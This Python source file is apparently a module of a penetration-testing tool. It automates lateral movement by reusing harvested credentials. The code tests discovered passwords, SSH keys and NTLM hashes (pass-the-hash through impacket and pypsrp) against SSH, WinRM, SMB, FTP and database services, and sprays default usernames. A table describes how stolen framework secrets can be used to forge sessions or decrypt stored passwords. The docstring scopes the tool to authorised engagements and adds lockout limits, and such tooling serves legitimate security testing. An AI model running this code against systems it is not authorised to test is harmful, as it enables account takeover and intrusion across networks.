"""Correlation engine — the high-value piece. On most lab boxes lateral
movement *is* credential reuse, so this does the heavy lifting.

Behaviors:
  1. cred → service reuse: test password/ssh_key creds against compatible
     discovered services; record successes and emit a high-severity pivot.
  2. pass-the-hash: NTLM hashes are tested (not cracked) against SMB/WinRM.
  3. capability: do NOT log in — surface the unlock action from metadata.

CONSTRAINT: stay within the engagement. Only discovered creds are tested, only
against discovered services/hosts. No external spraying.

Safety valves (for real engagements, not just CTF): duplicate attempts are
de-duplicated, already-verified pairs are skipped, an unreachable service is
probed once then abandoned, and the constructor exposes ``no_spray``,
``max_attempts_per_host`` and ``delay`` to stay under account-lockout thresholds.
"""
from __future__ import annotations

import socket
import time
from typing import Optional

from .patterns import nt_hash
from .store import LootStore
from .transport.ssh import SSHSession

# Unlock actions described (never executed) for known capability kinds.
_CAP_ACTIONS = {
    "jwt_sign": "Forge an admin/arbitrary JWT signed with this secret.",
    "flask_secret": "Forge/resign Flask session cookies (e.g. via flask-unsign).",
    "django_secret": "Forge Django session cookies / signed values.",
    "rails_secret": "Forge/decrypt Rails signed or encrypted cookies.",
    "aspnet_machinekey": "Forge ASP.NET ViewState / auth tokens with this machineKey.",
    "laravel_appkey": "Forge/decrypt Laravel signed & encrypted cookies (laravel-crypto-killer).",
    "symfony_appsecret": "Forge Symfony CSRF / remember-me / signed URIs.",
    "gpp_cpassword": "Decrypt with the public static GPP AES key (gpp-decrypt).",
    "winscp_password": "Decrypt with winscppasswd (fixed reversible algorithm).",
    "vnc_password": "Decrypt with vncpwd (fixed DES key).",
    "kube_config": "kubectl --kubeconfig <path> auth can-i --list.",
}

# Which service protos each credential kind is worth testing against.
_PASSWORD_PROTOS = {"ssh", "winrm", "smb", "mysql", "postgres", "mongodb", "mssql", "ftp"}
_HASH_PROTOS = {"winrm", "smb"}                       # pass-the-hash targets
_DEFAULT_PORTS = {"ssh": 22, "winrm": 5985, "smb": 445, "mysql": 3306,
                  "postgres": 5432, "mongodb": 27017, "mssql": 1433, "ftp": 21}
_EMPTY_LM = "aad3b435b51404eeaad3b435b51404ee"        # blank LM half for PtH


class CorrelationEngine:
    def __init__(self, store: LootStore, timeout: int = 8, max_users: int = 25,
                 no_spray: bool = False, max_attempts_per_host: Optional[int] = None,
                 delay: float = 0.0):
        self.store = store
        self.timeout = timeout
        self.max_users = max_users
        self.no_spray = no_spray                       # only test a cred's own username
        self.max_attempts_per_host = max_attempts_per_host
        self.delay = delay
        self._seen: set[tuple] = set()                 # dedup (proto,host,port,user,secret)
        self._reach: dict[tuple, bool] = {}            # (host,port) reachability cache
        self._attempts: dict[str, int] = {}            # per-host attempt counter
        self._pkey_cache: dict[tuple, object] = {}     # (secret,passphrase) -> paramiko key

    def run(self) -> list[dict]:
        creds = self.store.get_credentials()
        services = self.store.get_services()
        usernames = self._candidate_usernames(creds)
        password_secrets = [c["secret"] for c in creds
                            if c["kind"] == "password" and c.get("secret")]
        results: list[dict] = []

        for cred in creds:
            kind = cred["kind"]
            if kind == "capability":
                results.append(self._capability(cred))
                continue
            if kind not in ("password", "ssh_key", "hash"):
                continue

            # NTLM hashes are tested by pass-the-hash; non-NTLM hashes stay loot.
            nt = nt_hash(cred["secret"]) if kind == "hash" else None
            if kind == "hash" and not nt:
                continue

            # For ssh_key: parse the key ONCE (trying discovered passwords as
            # passphrases), not once per username.
            pkey = passphrase = None
            if kind == "ssh_key":
                pkey, passphrase = self._prepare_key(cred, password_secrets)
                if pkey is None:
                    results.append(self._emit_encrypted_key(cred))
                    continue

            for svc in services:
                if not self._compatible(cred, svc):
                    continue
                if svc["id"] in cred.get("verified_against", []):
                    continue  # already proven — don't re-auth (lockout hygiene)
                user = self._test(cred, svc, usernames, nt=nt, pkey=pkey)
                if user:
                    self.store.mark_verified(cred["id"], svc["id"])
                    results.append(self._emit_reuse(cred, svc, user,
                                                    pth=(kind == "hash")))
        return results

    # -- helpers ---------------------------------------------------------------
    def _candidate_usernames(self, creds: list[dict]) -> list[str]:
        """Order-preserving: discovered cred users, then real system users, then
        defaults. Sliced LAST so the actual accounts survive the cap (fixing the
        old sort-then-truncate that could drop the target user)."""
        ordered: list[str] = []
        seen: set[str] = set()

        def add(u: Optional[str]) -> None:
            u = (u or "").strip()
            if u and u not in seen:
                seen.add(u)
                ordered.append(u)

        for c in creds:
            add(c.get("username"))
        for f in self.store.get_findings(ranked=False):
            t = f.get("title") or ""
            if t.startswith("System user: "):
                add(t[len("System user: "):])
        for d in ("root", "admin", "administrator"):
            add(d)
        return ordered[: self.max_users]

    @staticmethod
    def _compatible(cred: dict, svc: dict) -> bool:
        proto = svc["proto"]
        if cred["kind"] == "ssh_key":
            return proto == "ssh"
        if cred["kind"] == "hash":
            return proto in _HASH_PROTOS
        return proto in _PASSWORD_PROTOS

    @staticmethod
    def _target(svc: dict) -> Optional[str]:
        """The host to actually connect to: the remote host from a conn string
        when present, else the foothold address."""
        return svc.get("remote_host") or svc.get("host")

    def _reachable(self, host: str, port: int) -> bool:
        key = (host, port)
        if key not in self._reach:
            try:
                with socket.create_connection((host, int(port)), timeout=self.timeout):
                    self._reach[key] = True
            except Exception:
                self._reach[key] = False
        return self._reach[key]

    def _prepare_key(self, cred: dict, password_secrets: list[str]):
        """Load the private key once. If it's encrypted, try each discovered
        password as the passphrase. Returns (pkey, passphrase) or (None, None)."""
        try:
            return self._load_pkey(cred["secret"], None), None
        except Exception:
            pass
        for pw in password_secrets:
            try:
                return self._load_pkey(cred["secret"], pw), pw
            except Exception:
                continue
        return None, None

    def _load_pkey(self, secret: str, passphrase: Optional[str]):
        ck = (secret, passphrase)
        if ck not in self._pkey_cache:
            self._pkey_cache[ck] = SSHSession._load_key(secret, passphrase)
        return self._pkey_cache[ck]

    def _test(self, cred: dict, svc: dict, usernames: list[str], nt=None,
              pkey=None) -> Optional[str]:
        host = self._target(svc)
        proto = svc["proto"]
        port = svc.get("port") or _DEFAULT_PORTS.get(proto)
        if not host or not port:
            return None
        if not self._reachable(host, int(port)):
            return None  # service dead/filtered — skip all its user attempts

        if cred.get("username"):
            users = [cred["username"]]
        elif self.no_spray:
            return None                                # don't spray without a user
        else:
            users = usernames

        for user in users:
            if not user:
                continue
            akey = (proto, host, port, user, cred["secret"])
            if akey in self._seen:
                continue
            if (self.max_attempts_per_host is not None and
                    self._attempts.get(host, 0) >= self.max_attempts_per_host):
                break
            self._seen.add(akey)
            self._attempts[host] = self._attempts.get(host, 0) + 1
            try:
                if self._attempt(proto, host, port, user, cred, nt, pkey):
                    return user
            except Exception:
                pass
            if self.delay:
                time.sleep(self.delay)
        return None

    def _attempt(self, proto, host, port, user, cred, nt, pkey) -> bool:
        if proto == "ssh":
            return self._ssh_try(host, port, user, cred, pkey=pkey)
        if proto == "winrm":
            return self._winrm_try(host, port, user, cred["secret"], nt=nt)
        if proto == "smb":
            return self._smb_try(host, port, user, cred["secret"], nt=nt)
        if proto in ("mysql", "postgres", "mongodb", "mssql"):
            return self._db_try(proto, host, port, user, cred["secret"])
        if proto == "ftp":
            return self._ftp_try(host, port, user, cred["secret"])
        return False

    def _ssh_try(self, host: str, port: int, user: str, cred: dict, pkey=None) -> bool:
        import paramiko
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        kw = dict(hostname=host, port=int(port), username=user, timeout=self.timeout,
                  banner_timeout=self.timeout, auth_timeout=self.timeout,
                  allow_agent=False, look_for_keys=False)
        try:
            if cred["kind"] == "ssh_key":
                client.connect(pkey=pkey, **kw)
            else:
                client.connect(password=cred["secret"], **kw)
            return True
        except Exception:
            return False
        finally:
            try:
                client.close()
            except Exception:
                pass

    def _winrm_try(self, host: str, port: int, user: str, secret: str, nt=None) -> bool:
        try:
            from pypsrp.client import Client
        except ImportError:
            return False
        password = f"{_EMPTY_LM}:{nt}" if nt else secret
        auth = "ntlm" if nt else "negotiate"
        try:
            client = Client(host, username=user, password=password, port=int(port),
                            ssl=False, auth=auth, cert_validation=False,
                            connection_timeout=self.timeout)
            _out, _err, rc = client.execute_cmd("echo 1")
            return rc == 0
        except Exception:
            return False

    def _smb_try(self, host: str, port: int, user: str, secret: str, nt=None) -> bool:
        """SMB auth (impacket, optional). Supports password or pass-the-hash."""
        try:
            from impacket.smbconnection import SMBConnection
        except ImportError:
            return False
        conn = None
        try:
            conn = SMBConnection(host, host, sess_port=int(port), timeout=self.timeout)
            if nt:
                conn.login(user, "", "", lmhash="", nthash=nt)
            else:
                conn.login(user, secret, "")
            return True
        except Exception:
            return False
        finally:
            try:
                if conn is not None:
                    conn.close()
            except Exception:
                pass

    def _ftp_try(self, host: str, port: int, user: str, secret: str) -> bool:
        import ftplib
        ftp = None
        try:
            ftp = ftplib.FTP()
            ftp.connect(host, int(port), timeout=self.timeout)
            ftp.login(user, secret)
            return True
        except Exception:
            return False
        finally:
            try:
                if ftp is not None:
                    ftp.quit()
            except Exception:
                pass

    def _db_try(self, proto: str, host: str, port, user: str, secret: str) -> bool:
        """Best-effort; silently skips if the optional driver isn't installed.
        Every client is closed in a finally so failed attempts don't leak."""
        if proto == "mysql":
            try:
                import pymysql
            except ImportError:
                return False
            conn = None
            try:
                conn = pymysql.connect(host=host, port=int(port or 3306), user=user,
                                       password=secret, connect_timeout=self.timeout)
                return True
            except Exception:
                return False
            finally:
                self._safe_close(conn)
        if proto == "postgres":
            try:
                import psycopg2
            except ImportError:
                return False
            conn = None
            try:
                conn = psycopg2.connect(host=host, port=int(port or 5432), user=user,
                                        password=secret, connect_timeout=self.timeout)
                return True
            except Exception:
                return False
            finally:
                self._safe_close(conn)
        if proto == "mongodb":
            try:
                from pymongo import MongoClient
            except ImportError:
                return False
            cl = None
            try:
                cl = MongoClient(host=host, port=int(port or 27017), username=user,
                                 password=secret,
                                 serverSelectionTimeoutMS=self.timeout * 1000)
                cl.admin.command("ping")
                return True
            except Exception:
                return False
            finally:
                self._safe_close(cl)
        if proto == "mssql":
            try:
                import pymssql
            except ImportError:
                return False
            conn = None
            try:
                conn = pymssql.connect(server=host, port=str(int(port or 1433)),
                                       user=user, password=secret,
                                       login_timeout=self.timeout)
                return True
            except Exception:
                return False
            finally:
                self._safe_close(conn)
        return False

    @staticmethod
    def _safe_close(client) -> None:
        try:
            if client is not None:
                client.close()
        except Exception:
            pass

    def _emit_reuse(self, cred: dict, svc: dict, user: str, pth: bool = False) -> dict:
        host = self._target(svc)
        label = "Pass-the-hash reuse" if pth else "Credential reuse"
        how = "NTLM hash" if pth else "secret"
        title = f"{label}: {svc['proto']} on {host}"
        detail = (f"{how} from {cred.get('source')} authenticates as '{user}' over "
                  f"{svc['proto']} on {host}:{svc.get('port')}. Handed to operator "
                  f"as a pivot.")
        self.store.add_finding(ftype="credential", title=title, severity="high",
                               detail=detail, source_module="correlation",
                               host_id=svc.get("host_id"))
        return {"type": "reuse", "proto": svc["proto"], "host": host,
                "port": svc.get("port"), "user": user, "source": cred.get("source"),
                "pth": pth}

    def _emit_encrypted_key(self, cred: dict) -> dict:
        title = "Encrypted private key — passphrase needed"
        detail = (f"A private key was recovered from {cred.get('source')} but is "
                  f"passphrase-protected and no discovered password unlocked it. "
                  f"Crack the passphrase (ssh2john) or find it, then re-correlate.")
        self.store.add_finding(ftype="info", title=title, severity="medium",
                               detail=detail, source_module="correlation",
                               host_id=cred.get("host_id"))
        return {"type": "info", "info": "encrypted_key", "source": cred.get("source")}

    def _capability(self, cred: dict) -> dict:
        md = cred.get("metadata") or {}
        cap = md.get("capability", "unknown")
        action = md.get("action") or _CAP_ACTIONS.get(
            cap, "Use this secret to unlock its associated action.")
        title = f"Capability: {cap}"
        detail = f"{action} (secret recovered from {cred.get('source')})"
        self.store.add_finding(ftype="capability", title=title, severity="high",
                               detail=detail, source_module="correlation",
                               host_id=cred.get("host_id"))
        return {"type": "capability", "capability": cap, "action": action,
                "source": cred.get("source")}
